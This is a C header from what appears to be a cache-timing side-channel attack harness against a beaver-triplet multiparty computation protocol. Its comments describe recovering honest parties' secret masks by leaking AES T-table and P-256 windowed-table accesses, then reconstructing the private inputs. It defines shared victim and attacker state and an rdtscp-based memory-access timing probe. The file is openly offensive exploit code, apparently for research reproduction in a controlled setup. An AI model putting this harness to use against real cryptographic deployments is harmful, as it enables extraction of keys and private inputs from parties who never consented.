#ifndef BEAVER_COMMON_H
#define BEAVER_COMMON_H
// Combined beaver-triplet SCA harness: ONE run recovers both honest masks.
//   * b_i  via the AES-PRG Black Swans attack (leak AES Te-tables -> key -> PRG byte)
//   * a_i  via the real P-256 OT-choice window leak
// then reconstructs x and y through the protocol openings.
// Reuses the validated headers: aes_leak.h, blackswans.h, ecc_real.h.
#include <stdint.h>
#include <stddef.h>
#include <x86intrin.h>
#include "ecc_real.h"

#define SHM_BEAVER_NAME "/beaver_full_attack_shm"

// P-256 table entry, one cache line per entry (stride 128) for a clean window leak.
typedef struct __attribute__((aligned(128))) { ECPt p; } ECTabEntry;

typedef struct __attribute__((aligned(64))) {
    // ---- AES-PRG leak target: real T-tables ----
    uint32_t Te[4][256] __attribute__((aligned(64)));

    // ---- P-256 OT-choice leak target: windowed tables over base G ----
    ECTabEntry ec_lo[16];               // ec_lo[d] = d * G
    ECTabEntry ec_hi[16];               // ec_hi[d] = d * 16G   (a_i*G = ec_lo[lo]+ec_hi[hi])

    // ---- per-party secrets (attacker-chosen ground truth) ----
    uint8_t aes_key2[16], aes_key3[16]; // PRG seeds (recovered by Black Swans)
    uint8_t a2, a3;                     // OT choice shares (recovered by EC leak)
    uint8_t b2, b3;                     // multiplier mask shares (recovered via PRG)
    uint8_t base_ctr[16];               // PRG base counter V0

    // ---- observable protocol wire ----
    volatile uint8_t M1_2, M1_3;        // b_i ^ PRG_byte(K_i, V0)   (visible, paper eq.8)

    // ---- control ----
    volatile uint8_t ready, exit_flag, done_ack;
    volatile uint8_t cur_party;         // 2 or 3: which party's secrets are live

    // AES leak control
    volatile uint8_t aes_load;          // recompute AES trace of aes_ctr under cur party key
    uint8_t aes_ctr[16];
    volatile uint8_t trig_aes;
    volatile uint8_t aes_round, aes_pos;
    volatile uint8_t want_M1;           // compute & publish M1 for cur party

    // EC leak control
    volatile uint8_t trig_ec;
    volatile uint8_t ec_win;            // 0 = ec_lo (low nibble), 1 = ec_hi (high nibble)
} BeaverShared;

static inline uint64_t beaver_measure(volatile uint8_t* ptr) {
    unsigned int aux;
    _mm_lfence();
    uint64_t s = __rdtscp(&aux);
    _mm_lfence();
    volatile uint8_t v = *ptr; (void)v;
    _mm_lfence();
    uint64_t e = __rdtscp(&aux);
    _mm_lfence();
    return e - s;
}

#endif
